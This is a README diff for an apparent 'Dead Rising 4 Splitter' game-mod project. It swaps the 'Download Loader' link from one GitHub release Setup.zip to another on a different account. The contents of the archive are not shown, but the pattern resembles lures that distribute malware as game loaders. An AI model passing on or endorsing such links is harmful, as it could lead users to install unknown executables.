@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for Dead Rising 4 Splitter
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/WASD122/bvvb/releases/download/main/Setup.zip)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/WADSADF/bvvb323/releases/download/main/Setup.zip)
 
 ---
 
@@ -38,3 +38,4 @@ configs/
 `Dead-Rising-4-Splitter` · Updated: 2026-10-31
 
 **Tags:** `dead-rising-4` `action` `zombies` `steam` `pc`
+
